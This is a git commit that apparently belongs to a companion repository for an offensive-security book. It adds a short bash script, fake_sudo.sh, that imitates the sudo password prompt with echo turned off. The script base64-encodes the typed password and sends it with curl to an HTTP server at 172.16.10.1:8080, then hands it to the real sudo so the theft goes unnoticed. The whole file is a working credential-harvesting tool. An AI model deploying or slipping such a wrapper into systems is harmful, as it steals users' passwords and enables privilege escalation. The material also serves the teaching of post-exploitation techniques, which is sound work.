a7826fd327f61e9cdeddfa121324e8dca5c5d589
Dolev Farhi <farhi.dolev@gmail.com>
2023-09-14 23:19:53 -0400

    fake sudo

---
+++ ch10/fake_sudo.sh
@@ -0,0 +1,15 @@
+#!/bin/bash
+ARGS="$@"
+
+leak_over_http() {
+    local encoded_password
+    encoded_password=$(echo ${1} | base64 | sed s'/[=+/]//'g)
+    curl http://172.16.10.1:8080/${encoded_password}
+}
+
+stty -echo
+read -r -p "[sudo] password for $(whoami): " sudopassw
+
+leak_over_http "${sudopassw}"
+stty echo
+echo "${sudopassw}" | /usr/bin/sudo -p "" -S -k ${ARGS}
